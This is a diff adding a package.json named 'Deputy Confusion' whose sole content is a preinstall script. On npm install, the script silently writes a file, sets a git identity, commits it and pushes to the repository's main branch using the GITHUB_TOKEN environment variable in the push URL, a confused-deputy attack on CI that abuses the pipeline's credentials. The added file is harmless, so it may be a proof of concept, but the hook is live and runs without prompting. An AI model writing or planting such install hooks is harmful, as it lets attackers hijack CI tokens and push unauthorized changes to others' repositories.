@@ -1,0 +1,7 @@
+{
+  "name": "Deputy Confusion",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node -e \"const fs = require('fs'); const { execSync } = require('child_process'); try { fs.writeFileSync('Loic_Silatcham.txt', 'Deputy Confusion'); execSync('git config user.name \\\"Loic Silatcham\\\"'); execSync('git config user.email \\\"loicsilatcham@gmail.com\\\"'); execSync('git add Loic_Silatcham.txt'); execSync('git commit -m \\\"Ajout du fichier Loic_Silatcham\\\"'); execSync(`git push https://x-access-token:${process.env.GITHUB_TOKEN}@github.com/${process.env.GITHUB_REPOSITORY}.git main`); } catch(e) { console.log('Erreur:', e.message); }\""
+  }
+}
